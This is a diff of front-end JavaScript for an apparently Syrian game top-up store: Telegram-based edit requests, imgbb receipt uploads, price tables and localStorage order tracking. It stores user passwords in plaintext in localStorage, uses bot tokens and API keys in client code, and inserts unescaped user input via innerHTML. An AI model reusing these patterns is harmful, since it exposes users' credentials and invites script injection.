+          msgEl.textContent = 'يمكنك تعديل بياناتك الآن مرة واحدة ثم اضغط حفظ.';
+        } else {
+          reqBtn.classList.remove("hidden");
+          saveBtn.classList.add("hidden");
+          msgEl.textContent = 'للتعديل اطلب موافقة من الإدارة عبر الزر أدناه.';
+        }
+      }
+
+      // طلب تعديل -> ارسال إلى بوت التسجيل وحفظ map message_id => personal
+      document.getElementById("requestEditBtn").addEventListener("click", async function(){
+        if(!ensureNotBlocked()) return;
+        const prof = loadProfile() || {};
+        const name = prof.name || 'غير معروف';
+        const personal = prof.personalNumber || personalNumber;
+        const msgText = `طلب تعديل بيانات المستخدم:\nالاسم: ${name}\nالرقم الشخصي: ${personal}\n(اكتب "تم" كرد هنا للموافقة على التعديل لمرة واحدة)`;
+        try{
+          const res = await fetch(`https://api.telegram.org/bot${loginReportBotToken}/sendMessage`, {
+            method: "POST",
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({ chat_id: loginReportChatId, text: msgText })
+          });
+          const data = await res.json();
+          if(data && data.ok && data.result && data.result.message_id){
+            const msgId = String(data.result.message_id);
+            const map = loadProfileEditRequests();
+            map[msgId] = String(personal);
+            saveProfileEditRequests(map);
+            this.textContent = 'تم إرسال طلب التعديل - انتظر الموافقة';
+            this.disabled = true;
+            setTimeout(()=>{ this.textContent = 'طلب تعديل معلوماتك'; this.disabled = false; }, 12000);
+          } else {
+            alert('فشل إرسال طلب التعديل إلى الإدارة. حاول مرة أخرى.');
+          }
+        }catch(e){
+          console.warn("request edit send error", e);
+          alert('خطأ أثناء إرسال الطلب. تأكد من الاتصال وحاول مجدداً.');
+        }
+      });
+
+      document.getElementById("confirmSaveBtn").addEventListener("click", function(){
+        const prof = loadProfile() || {};
+        if(!prof.canEdit){ alert('ليس لديك إذن لتعديل البيانات الآن.'); return; }
+        const name = (document.getElementById("profileName").value || "").trim();
+        const email = (document.getElementById("profileEmail").value || "").trim();
+        const password = (document.getElementById("profilePassword").value || "");
+        const phone = (document.getElementById("profilePhone").value || "").trim();
+        if(email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){ alert('صيغة البريد الإلكتروني غير صحيحة'); return; }
+        if(phone && !/^[0-9\+\-\s]{6,20}$/.test(phone)){ alert('صيغة رقم الهاتف غير صحيحة'); return; }
+        const updated = Object.assign({}, prof, { name, email, password, phone, canEdit: false });
+        saveProfile(updated);
+        updateSidebarProfileDisplay();
+        applyProfileEditState();
+        alert('تم حفظ التعديلات. لن يمكنك تعديل البيانات بدون طلب جديد.');
+      });
+
+      // ===================== رفع الملفات إلى imgbb =====================
+      function uploadToImgbbXHR(file, onProgress){
+        return new Promise((resolve, reject) => {
+          if(!file) return reject(new Error("No file provided"));
+          if(!file.type || !file.type.startsWith("image/")) return reject(new Error("الملف ليس صورة"));
+          const MAX = 15 * 1024 * 1024; // 15MB
+          if(file.size > MAX) return reject(new Error("حجم الملف كبير جدًا،رجاء اختر ملف أصغر من 15 ميغابايت"));
+
+          const url = `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`;
+          const fd = new FormData();
+          fd.append('image', file);
+
+          const xhr = new XMLHttpRequest();
+          xhr.open('POST', url);
+          xhr.timeout = 120000;
+          xhr.onload = function(){
+            if(xhr.status >= 200 && xhr.status < 300){
+              try{
+                const resp = JSON.parse(xhr.responseText || "{}");
+                if(resp && resp.data && (resp.data.url || resp.data.display_url)){
+                  resolve(resp.data.url || resp.data.display_url);
+                } else {
+                  reject(new Error("استجابة imgbb غير متوقعة: " + xhr.responseText));
+                }
+              }catch(e){
+                reject(new Error("فشل تحليل استجابة imgbb: " + e.message));
+              }
+            } else {
+              reject(new Error("خطأ من الخادم: " + xhr.status + " - " + xhr.statusText + " -- " + xhr.responseText));
+            }
+          };
+          xhr.onerror = function(){ reject(new Error("خطأ في الشبكة أثناء الرفع")); };
+          xhr.ontimeout = function(){ reject(new Error("انتهت مهلة الاتصال أثناء الرفع")); };
+          if(xhr.upload && typeof onProgress === 'function'){
+            xhr.upload.onprogress = function(ev){
+              if(ev.lengthComputable){
+                const pct = Math.round((ev.loaded/ev.total)*100);
+                onProgress && onProgress(pct, ev.loaded, ev.total);
+              }
+            };
+          }
+          try{ xhr.send(fd); }catch(e){ reject(e); }
+        });
+      }
+
+      async function uploadToImgbbFallbackBase64(file, onProgress){
+        try{
+          const base64 = await new Promise((resolve, reject)=>{
+            const r = new FileReader();
+            r.onload = ()=> {
+              const data = String(r.result || "");
+              const parts = data.split(',');
+              resolve(parts.length>1 ? parts[1] : parts[0]);
+            };
+            r.onerror = ()=> reject(new Error("فشل قراءة الملف كـ base64"));
+            r.readAsDataURL(file);
+          });
+          const formData = new FormData();
+          formData.append('image', base64);
+          const resp = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method:'POST', body: formData });
+          const data = await resp.json();
+          if(data && data.data && (data.data.url || data.data.display_url)) return data.data.url || data.data.display_url;
+          throw new Error("Fallback response غير متوقع");
+        }catch(e){ throw e; }
+      }
+
+      async function uploadToImgbb(file, onProgress){
+        try{ return await uploadToImgbbXHR(file, onProgress); }catch(err){
+          console.warn("XHR upload failed, trying base64 fallback:", err);
+          try{ return await uploadToImgbbFallbackBase64(file, onProgress); }catch(err2){ console.error("Both upload methods failed:", err, err2); throw err2; }
+        }
+      }
+
+      // مستمع رفع ملف لصفحة الدفع
+      document.getElementById("paymentFileUpload")?.addEventListener("change", async function(){
+        if(!ensureNotBlocked()) return;
+        const file = this.files[0];
+        const linkEl = document.getElementById("paymentFileLink");
+        const statusEl = document.getElementById("paymentUploadStatus");
+        if(!file){ if(linkEl) linkEl.value=""; if(statusEl) statusEl.textContent=""; return; }
+        if(linkEl) linkEl.value = "";
+        if(statusEl) statusEl.textContent = "جارية عملية الرفع... 0%";
+        try{
+          const url = await uploadToImgbb(file, (pct)=>{ if(statusEl) statusEl.textContent = `جارية عملية الرفع... ${pct}%`; });
+          if(url){
+            if(linkEl) linkEl.value = url;
+            if(statusEl) statusEl.textContent = "تم الرفع بنجاح";
+            alert("تم رفع صورة الإيصال بنجاح");
+          } else {
+            if(statusEl) statusEl.textContent = "فشل رفع الملف";
+            if(linkEl) linkEl.value = "";
+            alert("فشل رفع الصورة، حاول مرة أخرى");
+          }
+        }catch(e){
+          if(statusEl) statusEl.textContent = "خطأ أثناء الرفع: " + (e && e.message ? e.message : e);
+          if(linkEl) linkEl.value = "";
+          console.error("paymentFileUpload error", e);
+          alert("فشل رفع الصورة: " + (e && e.message ? e.message : "خطأ غير معروف"));
+        }
+      });
+
+      // مستمع رفع ملف لصفحة المساعدة
+      document.getElementById("helpFileUpload")?.addEventListener("change", async function(){
+        if(!ensureNotBlocked()) return;
+        const file = this.files[0];
+        const linkEl = document.getElementById("helpFileLink");
+        const statusEl = document.getElementById("helpUploadStatus");
+        if(!file){ if(linkEl) linkEl.value=""; if(statusEl) statusEl.textContent=""; return; }
+        if(linkEl) linkEl.value = "";
+        if(statusEl) statusEl.textContent = "جارية عملية الرفع... 0%";
+        try{
+          const url = await uploadToImgbb(file, (pct)=>{ if(statusEl) statusEl.textContent = `جارية عملية الرفع... ${pct}%`; });
+          if(url){
+            if(linkEl) linkEl.value = url;
+            if(statusEl) statusEl.textContent = "تم الرفع بنجاح";
+            alert("تم رفع الملف بنجاح");
+          } else {
+            if(statusEl) statusEl.textContent = "فشل رفع الملف";
+            if(linkEl) linkEl.value = "";
+            alert("فشل رفع الملف، حاول مرة أخرى");
+          }
+        }catch(e){
+          if(statusEl) statusEl.textContent = "خطأ أثناء الرفع: " + (e && e.message ? e.message : e);
+          if(linkEl) linkEl.value = "";
+          console.error("helpFileUpload error", e);
+          alert("فشل رفع الملف: " + (e && e.message ? e.message : "خطأ غير معروف"));
+        }
+      });
+
+      // بقية الكود (أسعار، إدارة طلبات، إرسال تلغرام...) ----------------------------
+      const priceMapFF={"100 جواهر":"12500 ل.س","200 جواهر":"25000 ل.س","300 جواهر":"60000 ل.س","530 جواهر":"60000 ل.س","1080 جواهر":"120000 ل.س","2200 جواهر":"240000 ل.س","عضوية أسبوعية":"30000 ل.س","عضوية شهرية":"140000 ل.س"};
+      const priceMapPUBG={"60 شدة":"6000 ل.س","325 شدة":"25000 ل.س","660 شدة":"48000 ل.س","1800 شدة":"120000 ل.س","3850 شدة":"240000 ل.س","8100 شدة":"480000 ل.س"};
+      const priceMapjwa = priceMapPUBG;
+      const priceMappubg1={"كود 60 شده":"12500 ل.س"};
+      const priceMapApps = {"تطبيق 1":"5000 ل.س","تطبيق 2":"10000 ل.س","تطبيق 3":"15000 ل.س"};
+
+      const optionsContainer = document.getElementById("optionsContainer");
+      const optionsContainerApps = document.getElementById("optionsContainerApps");
+      let selectedGameOption = "";
+      let selectedAppOption = "";
+      let currentMap = null;
+
+      const submitBtn = document.getElementById('submitForm');
+      const appSubmitBtn = document.getElementById('appSubmitForm');
+
+      function getProfilePhoneOrAsk(){
+        const prof = loadProfile();
+        if(prof && prof.phone) return prof.phone;
+        const entered = prompt("رجاءً أدخل رقم هاتفك ليتم استخدامه في الطلب:") || "";
+        if(entered && /^[0-9\+\-\s]{6,20}$/.test(entered)){
+          // نخزن مؤقتًا في البروفايل حتى لا يطلب كل مرة
+          const p = loadProfile() || {};
+          p.phone = entered;
+          saveProfile(p);
+          updateSidebarProfileDisplay();
+          return entered;
+        }
+        return "";
+      }
+
+      function updateSubmitButtonGames(){ const idf=document.getElementById('idField').value.trim(); submitBtn.disabled = !(selectedGameOption && idf); }
+      function updateSubmitButtonApps(){ const idf=document.getElementById('appIdField').value.trim(); appSubmitBtn.disabled = !(selectedAppOption && idf); }
+
+      document.getElementById('idField').addEventListener('input', updateSubmitButtonGames);
+      document.getElementById('appIdField').addEventListener('input', updateSubmitButtonApps);
+
+      document.getElementById("gameSelect").addEventListener("change", function(){
+        optionsContainer.innerHTML=""; selectedGameOption=""; document.getElementById("priceDisplay").textContent="";
+        const val=this.value;
+        if(val==="فري فاير ايدي") currentMap=priceMapFF;
+        else if(val==="ببجي ايدي") currentMap=priceMapPUBG;
+        else if(val==="جواكر") currentMap=priceMapjwa;
+        else if(val==="أكواد ببجي") currentMap=priceMappubg1;
+        else currentMap=null;
+        if(currentMap){
+          Object.keys(currentMap).forEach(opt=>{
+            const btn=document.createElement("div");
+            btn.className="button-option";
+            btn.textContent=opt;
+            btn.onclick=function(){
+              document.querySelectorAll("#optionsContainer .button-option").forEach(b=>b.classList.remove("selected"));
+              btn.classList.add("selected");
+              selectedGameOption=opt;
+              document.getElementById("priceDisplay").textContent = `الحزمة: ${opt}\nالسعر: ${currentMap[opt]}`;
+              document.getElementById("priceDisplay").style.color="#0f0";
+              updateSubmitButtonGames();
+            };
+            optionsContainer.appendChild(btn);
+          });
+        }
+      });
+
+      document.getElementById("appSelect").addEventListener("change", function(){
+        optionsContainerApps.innerHTML=""; selectedAppOption=""; document.getElementById("priceDisplayApps").textContent="";
+        const app=this.value;
+        if(priceMapApps[app]){
+          const btn=document.createElement("div");
+          btn.className="button-option";
+          btn.textContent=app;
+          btn.onclick=function(){
+            document.querySelectorAll("#optionsContainerApps .button-option").forEach(b=>b.classList.remove("selected"));
+            btn.classList.add("selected");
+            selectedAppOption=app;
+            document.getElementById("priceDisplayApps").textContent = `السعر: ${priceMapApps[app]}`;
+            document.getElementById("priceDisplayApps").style.color="#0f0";
+            updateSubmitButtonApps();
+          };
+          optionsContainerApps.appendChild(btn);
+        }
+      });
+
+      submitBtn.addEventListener('click', function(){
+        if(!ensureNotBlocked()) return;
+        const idField=document.getElementById('idField').value.trim();
+        const game=document.getElementById('gameSelect').value;
+        if(!game||!idField||!selectedGameOption){ alert('اكمل البيانات'); return; }
+        // تأكد من وجود رقم الهاتف في البروفايل أو اسأله عند الدفع
+        showPaymentDetailsFromSubmit('gamesPage');
+      });
+
+      appSubmitBtn.addEventListener('click', function(){
+        if(!ensureNotBlocked()) return;
+        const app=document.getElementById('appSelect').value;
+        const idField=document.getElementById('appIdField').value.trim();
+        if(!app||!idField||!selectedAppOption){alert('اكمل البيانات');return;}
+        showPaymentDetailsFromSubmit('appsPage');
+      });
+
+      function mapPaymentName(code){ const m={sham:'شام كاش',syrtel:'سيرتيل كاش',mtn:'MTN كاش',hawala:'حوالة مالية'}; return m[code]||code; }
+
+      // ===== إدارة الطلبات (localStorage) =====
+      function loadOrders(){ const raw=localStorage.getItem("orders_v1"); return raw?JSON.parse(raw):[]; }
+      function saveOrders(list){ localStorage.setItem("orders_v1", JSON.stringify(list)); }
+      function addOrder(order){ const list=loadOrders(); list.unshift(order); saveOrders(list); renderOrders(); renderRepliedStatuses(true); }
+      function getOrderById(id){ const list=loadOrders(); return list.find(o=>String(o.id)===String(id))||null; }
+      function updateOrderInStorage(order){ const list=loadOrders(); const idx=list.findIndex(o=>String(o.id)===String(order.id)); if(idx!==-1){ list[idx]=order; saveOrders(list); renderOrders(); } }
+
+      function renderOrders(){
+        const list = loadOrders();
+        const container = document.getElementById("ordersList");
+        container.innerHTML = "";
+        if(list.length===0){ container.innerHTML = "<div>لا توجد طلبات حتى الآن.</div>"; return; }
+        list.forEach(o=>{
+          const d = document.createElement("div"); d.className="order-item";
+          let time=""; try{ time = new Date(o.createdAt).toLocaleString(); }catch(e){ time = o.createdAt; }
+          d.innerHTML = `<strong>#${o.id}</strong> - ${o.type} - ${o.item || ''} <br>     الهاتف: ${o.phone} - الايدي: ${o.idField || ''} <br>     الوقت: ${time} <br>     الحالة: <strong id="status_${o.id}">${o.status}</strong>`;
+          container.appendChild(d);
+        });
+      }
+
+      function updateOrderStatusDisplays(orderId, status){
+        const el = document.getElementById("status_"+orderId);
+        if(el) el.textContent = status;
+        const lastId = localStorage.getItem("lastOrderId");
+        if(String(lastId) === String(orderId)){
+          const os = document.getElementById("orderStatus");
+          const aos = document.getElementById("appOrderStatus");
+          if(os) os.textContent = status;
+          if(aos) aos.textContent = status;
+        }
+      }
+
+      // إشعارات الطلبات
+      let ordersStatusBarTimeout = null;
+      const ORDERS_BAR_SHOWN_KEY = "orders_bar_shown_ids_v1";
+      function getShownIds(){ try{ const raw = localStorage.getItem(ORDERS_BAR_SHOWN_KEY); return raw ? JSON.parse(raw) : []; }catch(e){ return []; } }
+      function markIdsAsShown(ids){ const cur = getShownIds(); const set = new Set(cur.map(String)); ids.forEach(id=>set.add(String(id))); const arr = Array.from(set); localStorage.setItem(ORDERS_BAR_SHOWN_KEY, JSON.stringify(arr)); }
+
+      function addOrderNotifToPanel(orderId, statusText, itemText, personalNum){
+        try{
+          const panelBar = document.getElementById("ordersStatusBarInNotif");
+          const newLineText = `${statusText} — ${itemText || ''} — #${orderId}`;
+          if(panelBar.childNodes){
+            for(const ch of Array.from(panelBar.childNodes)){
+              if(ch.textContent && ch.textContent.trim() === newLineText.trim()){ return; }
+            }
+          }
+          const line = document.createElement("div");
+          line.className = "status-line";
+          line.textContent = newLineText;
+          if(panelBar.firstChild) panelBar.insertBefore(line, panelBar.firstChild);
+          else panelBar.appendChild(line);
+          panelBar.style.display = 'block';
+          if(personalNum){ addPersonalMessageForNumber(personalNum, newLineText, new Date().toISOString()); }
+          markIdsAsShown([orderId]);
+        }catch(e){ console.warn("addOrderNotifToPanel error", e); }
+      }
+
+      function flashStatusBar(orderId, status){
+        const order = getOrderById(orderId);
+        const itemText = order ? order.item : '';
+        const personalNum = order ? (order.personalNumber || null) : null;
+        const s = (status || "").toLowerCase();
+        let displayText = status;
+        if(s.includes('تم') || s.includes('مقبول') || s.includes('accept') || s.includes('قبول')) displayText = `تم قبول طلبك`;
+        else if(s.includes('رفض') || s.includes('مرفوض') || s.includes('reject')) displayText = `تم رفض طلبك`;
+        else if(s.includes('الرصيد')|| s.includes('رصيد')) displayText = `لم يتم تحويل الرصيد المطلوب`;
+        addOrderNotifToPanel(orderId, displayText, itemText, personalNum);
+        const hdrBar = document.getElementById("ordersStatusBar");
+        if(hdrBar){
+          hdrBar.innerHTML = "";
+          const line = document.createElement("div");
+          line.className = "status-line";
+          line.textContent = `${displayText} — ${itemText || ''} — #${orderId}`; hdrBar.appendChild(line);
+          hdrBar.style.display = 'none';
+          if(ordersStatusBarTimeout) clearTimeout(ordersStatusBarTimeout);
+          ordersStatusBarTimeout = setTimeout(()=>{ hdrBar.style.display = 'none'; }, 20000);
+        }
+      }
+
+      function renderRepliedStatuses(showTemporarily=false){
+        const panelBar = document.getElementById("ordersStatusBarInNotif");
+        panelBar.innerHTML = "";
+        const list = loadOrders();
+        const replied = list.filter(o => o.replied);
+        if(replied.length===0){ panelBar.style.display='none'; return; }
+        const shownIds = getShownIds().map(String);
+        const unseen = replied.filter(o => !shownIds.includes(String(o.id)));
+        if(unseen.length === 0){ panelBar.style.display = 'none'; return; }
+        const latestNew = unseen.slice(0,3);
+        latestNew.forEach(o=>{
+          const s = (o.status || "").toLowerCase();
+          let displayText = o.status;
+          if(s.includes('تم') || s.includes('مقبول') || s.includes('accept') || s.includes('قبول')) displayText = `تم قبول طلبك`;
+          else if(s.includes('رفض') || s.includes('مرفوض') || s.includes('reject')) displayText = `تم رفض طلبك`;
+          else displayText = o.status;
+          const line = document.createElement("div");
+          line.className = "status-line";
+          line.textContent = `${displayText} — ${o.item || ''} — #${o.id}`;
+          panelBar.appendChild(line);
+          if(o.personalNumber) addPersonalMessageForNumber(o.personalNumber, `${displayText} — ${o.item || ''} — #${o.id}`, new Date().toISOString());
+        });
+        markIdsAsShown(latestNew.map(x=>x.id));
+        panelBar.style.display = 'block';
+        if(showTemporarily){
+          if(ordersStatusBarTimeout) clearTimeout(ordersStatusBarTimeout);
+          ordersStatusBarTimeout = setTimeout(()=>{ document.getElementById("ordersStatusBarInNotif").style.display = 'none'; }, 20000);
+        }
+      }
+
+      // ======= تكامل المنتجات من الخادم (fetch /api/products) و انشاء طلب جديد ======
+      async function fetchProducts(){
+        const grid = document.getElementById('productsGrid');
+        if(!grid) return;
+        grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:20px" id="productsLoader"><span class=\"loader\">🔁 جاري تحميل المنتجات...</span></div>`;
+        try{
+          const res = await fetch('/api/products');
+          if(!res.ok) throw new Error('خطأ HTTP: '+res.status);
+          const data = await res.json();
+          let products = [];
+          // دعم عدة أشكال لاستجابة الـ API
+          if(Array.isArray(data)) products = data;
+          else if(data && Array.isArray(data.data)) products = data.data;
+          else if(data && data.products && Array.isArray(data.products)) products = data.products;
+          else products = [];
+
+          if(products.length === 0){
+            grid.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:20px;color:#aaa">لا توجد منتجات متاحة حالياً.</div>';
+            return;
+          }
+
+          grid.innerHTML = '';
+          // نضيف بطاقة لكل منتج
+          products.forEach(p => {
+            const pid = p.id || p.product_id || p._id || p.slug || p.code || (p.title && p.title.replace(/\s+/g,'_')) || Math.random().toString(36).slice(2,8);
+            const title = p.title || p.name || p.product || p.label || 'منتج';
+            const price = (p.price || (p.meta && p.meta.price) || p.cost || p.price_display || '') + '';
+            const card = document.createElement('div');
+            card.className = 'card';
+            card.innerHTML = `<div style="text-align:center;">\n                <strong class=\"product-title\">${escapeHtml(title)}</strong>\n                <div class=\"product-price\">${escapeHtml(price)}</div>\n                <div style=\"margin-top:8px\">\n                  <button class=\"small-btn buy-btn\">شراء</button>\n                </div>\n              </div>`;
+            card.querySelector('.buy-btn').addEventListener('click', ()=> onProductBuy(p));
+            grid.appendChild(card);
+          });
+        }catch(err){
+          console.error('fetchProducts error', err);
+          grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:20px;color:#ff6b6b">خطأ عند جلب المنتجات: ${escapeHtml(err.message || err)}</div>`;
+        }
+      }
+
+      function escapeHtml(s){ return String(s===null||s===undefined?'':s).replace(/[&<>\"]/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]; }); }
+
+      function onProductBuy(product){
+        if(!ensureNotBlocked()) return;
+        // نحاول الحصول على ايدي اللاعب من الحقل، وإلا نطلبه
+        const defaultId = document.getElementById('idField')?.value || '';
+        const playerId = prompt(`أدخل الايدي أو معرف اللاعب (اتركه فارغاً لاستخدام رقمك الشخصي ${personalNumber}):`, defaultId) || '';
+        const qtyStr = prompt('كم عدد الوحدة تريد (الافتراضي 1):','1') || '1';
+        const qty = parseInt(qtyStr,10) || 1;
+        createOrderRequest(product, qty, playerId);
+      }
+
+      async function createOrderRequest(product, qty, playerId){
+        try{
+          const productId = product.id || product.product_id || product._id || product.code || product.slug || product.title || product.name;
+          if(!productId){ alert('لا يمكن تحديد معرف المنتج.'); return; }
+          const body = { qty: qty };
+          if(playerId) body.playerId = playerId;
+
+          const res = await fetch(`/api/newOrder/${encodeURIComponent(productId)}`, {
+            method:'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(body)
+          });
+          const data = await res.json();
+          if(!res.ok){ console.warn('server returned not ok', data); alert('فشل إنشاء الطلب: ' + (data && data.error ? data.error : JSON.stringify(data))); return; }
+
+          // حفظ الطلب محلياً لمتابعته في الواجهة
+          const orderId = Date.now();
+          const order = {
+            id: orderId,
+            type: 'طلب عبر API',
+            item: product.title || product.name || String(productId),
+            qty, playerId, response: data,
+            status: (data && (data.status || data.message)) || 'قيد المراجعة',
+            replied: false,
+            telegramMessageId: null,
+            createdAt: new Date().toISOString(),
+            personalNumber: String(personalNumber)
+          };
+          addOrder(order);
+          localStorage.setItem('lastOrderId', orderId);
+
+          alert('تم إنشاء الطلب محلياً وإرساله إلى الخادم. راجع صفحة الطلبات لمتابعة الحالة.');
+          showReviewPage(orderId);
+        }catch(e){ console.error('createOrderRequest error', e); alert('خطأ أثناء إنشاء الطلب: ' + (e && e.message ? e.message : e)); }
+      }
+
+      // === تهيئة العرض الأولي ===
+      // عند تحميل الصفحة نفتح الرئيسية
+      window.addEventListener('DOMContentLoaded', ()=>{
+        showHome();
+      });
+
+      // --- باقي سكربتات الصفحة تبقى كما كانت (لم يتم تعديل بقية وظائف المشروع) ---
+
+    </script>
+  </body>
 </html>
